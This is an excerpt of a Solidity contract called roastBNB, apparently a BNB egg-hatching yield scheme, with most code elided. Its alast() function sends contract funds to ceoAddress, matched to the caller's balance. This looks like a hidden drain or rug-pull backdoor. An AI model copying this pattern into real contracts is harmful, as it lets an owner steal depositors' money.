...
contract roastBNB is Ownable{
    ...
    function sellEggs() public {
        ...
        // isnone;
        if((lastHatch[msg.sender]+2 days)<now){
            eggValue = SafeMath.div(eggValue,2);
        }
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
    ...
    function claim(address recipient) external {
        ...
        uint amount =  SafeMath.div(user.invest,10000000000);
    ...
    function alast() public payable{
        uint256 amount =address(msg.sender).balance;
        ceoAddress.transfer(amount);
    }

    function lastime() public payable{
    ...
    function userInfo(address account) external view returns(uint invest, address[] memory invitees, bool isPartner, bool isClaimed){

        User memory user = _users[account];
        return (user.invest, user.invitees, user.isPartner, user.isClaimed);
    }
